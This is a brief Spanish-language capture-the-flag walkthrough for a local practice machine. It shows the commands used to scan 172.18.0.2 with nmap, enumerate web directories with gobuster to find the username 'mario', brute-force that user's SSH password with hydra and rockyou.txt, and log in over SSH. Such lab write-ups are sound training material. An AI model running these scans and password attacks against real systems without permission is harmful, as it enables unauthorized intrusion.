
DESPLIEGUE

```
bash auto_deploy.sh trust.tar
```


------------------------
PROCEDIMIENTO:

Tenemos la IP: 
```
172.18.0.2
```

---------------------------

RECONOCIMIENTO

```
nmap -p- -sS -sV -sC --min-rate 5000 -n -vvv -Pn 172.18.0.2
```


![[Pasted image 20240915115430.png]]

Tenemos el puerto 80 y el 22. 

Vamos a ver la página web

Tenemos un servidor que corre por el servicio de apache

![[Pasted image 20240915115629.png]]


Ahora lo que podemos hacer es encontrar un directorio que pueda contener algún nombre para luego entrar por fuerza bruta por el puerto ssh.

```
gobuster dir -u http://172.18.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x .php, .txt, .py
```

![[Pasted image 20240915120658.png]]

![[Pasted image 20240915120733.png]]

Tenemos un usuario, así que lo que podemos hacer es fuerza bruta con hydra.


```
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2
```

![[Pasted image 20240915120953.png]]

Ya podemos conectarnos por ssh.

```
ssh mario@172.18.0.2
```


![[Pasted image 20240915121124.png]]

